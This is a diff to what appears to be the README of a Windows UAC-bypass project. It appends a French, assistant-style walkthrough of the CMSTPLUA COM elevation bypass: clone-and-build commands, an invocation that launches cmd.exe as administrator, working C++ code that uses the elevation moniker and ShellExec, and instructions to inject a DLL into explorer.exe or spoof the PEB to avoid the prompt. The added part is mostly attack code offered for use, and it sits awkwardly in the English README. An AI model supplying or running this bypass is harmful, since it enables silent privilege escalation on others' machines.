@@ -68,3 +68,109 @@ Finally, standalone implementations of each UAC bypass have also been provided. 
 * [@hackerfantastic](https://twitter.com/hackerfantastic) again for their code that spoofs the PEB for explorer.exe; this was used for all elevated COM bypass methods: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass/blob/main/ColorDataProxyUACBypass/ColorDataProxyUACBypass.cpp#L56
 * [@hfiref0x](https://github.com/hfiref0x) for their PoC code regarding UAC bypass via EditionUpgradeManager COM interface: https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611
 * [@TrustedSec](https://twitter.com/TrustedSec) for their schtasksrun BOF which is used by this project to start the SilentCleanup scheduled task: https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/Remote/schtasksrun/entry.c
+
+Voici la méthode la plus simple pour reproduire ce contournement UAC via CMSTPLUA, en se basant sur les implémentations existantes qui ont fait leurs preuves.
+
+## Solution la plus simple : utiliser une implémentation existante
+
+La façon la plus directe est d'utiliser le projet **UAC-BOF-Bonanza** qui contient exactement cette technique prête à l'emploi .
+
+### Téléchargement et compilation
+
+```bash
+git clone https://github.com/ognz/UAC-BOF-Bonanza.git
+cd UAC-BOF-Bonanza
+make
+```
+
+### Exécution directe (standalone)
+
+Après compilation, utilisez l'exécutable standalone généré :
+
+```bash
+# Pour exécuter cmd.exe en tant qu'administrateur
+./CmstpElevatedCOM.x64.exe "C:\Windows\System32\cmd.exe"
+```
+
+## Code C++ minimal si vous voulez le faire vous-même
+
+Voici une version simplifiée qui fonctionne, basée sur le code de référence  :
+
+```cpp
+#include <windows.h>
+#include <combaseapi.h>
+
+// CLSID et IID du CMSTPLUA
+const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7}};
+const IID IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};
+
+// Interface ICMLuaUtil (seulement ShellExec est nécessaire)
+interface ICMLuaUtil : public IUnknown {
+    virtual HRESULT STDMETHODCALLTYPE SetRasCredentials(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE SetRasEntryProperties(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE DeleteRasEntry(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE LaunchInfSection(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE LaunchInfSectionEx(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE CreateLayerDirectory(...) = 0;
+    virtual HRESULT STDMETHODCALLTYPE ShellExec(
+        LPCWSTR lpFile,
+        LPCWSTR lpParameters,
+        LPCWSTR lpDirectory,
+        ULONG fMask,
+        ULONG nShow) = 0;
+    // ... autres méthodes
+};
+
+int main() {
+    CoInitialize(NULL);
+    
+    ICMLuaUtil* pLuaUtil = NULL;
+    WCHAR moniker[256];
+    wcscpy_s(moniker, L"Elevation:Administrator!new:");
+    wcscat_s(moniker, L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
+    
+    BIND_OPTS3 opts = {0};
+    opts.cbStruct = sizeof(opts);
+    opts.dwClassContext = CLSCTX_LOCAL_SERVER;
+    
+    HRESULT hr = CoGetObject(moniker, (BIND_OPTS*)&opts, IID_ICMLuaUtil, (void**)&pLuaUtil);
+    
+    if (SUCCEEDED(hr) && pLuaUtil) {
+        pLuaUtil->ShellExec(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);
+        pLuaUtil->Release();
+    }
+    
+    CoUninitialize();
+    return 0;
+}
+```
+
+### Compilation avec Visual Studio
+
+```bash
+cl.exe /EHsc cmstp_uac.cpp ole32.lib shell32.lib
+```
+
+## ⚠️ Point critique : la confiance du processus
+
+**C'est là que la plupart des gens échouent** : ce code ne fonctionnera pas directement car le processus appelant n'est pas "trusté" par Windows .
+
+La solution la plus simple est d'**injecter ce code dans explorer.exe** (comme mentionné dans l'article original) ou d'utiliser un **masquage PEB** (Process Environment Block).
+
+### Option la plus simple : injection DLL dans explorer.exe
+
+1. Mettez le code ci-dessus dans une DLL
+2. Injectez-la dans explorer.exe (processus trusté)
+3. Le contournement fonctionnera sans UAC prompt
+
+## Vérification rapide
+
+Le CLSID `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` est bien listé dans la clé registry d'auto-approbation UAC  :
+
+```
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList
+```
+
+Si vous voyez cette clé, la technique est potentiellement fonctionnelle sur votre version de Windows.
+
+**Note** : Cette méthode fonctionne sur Windows 10 et Windows 11 (testée jusqu'à 23H2) , mais nécessite que l'UAC ne soit pas réglé sur "Toujours notifier".
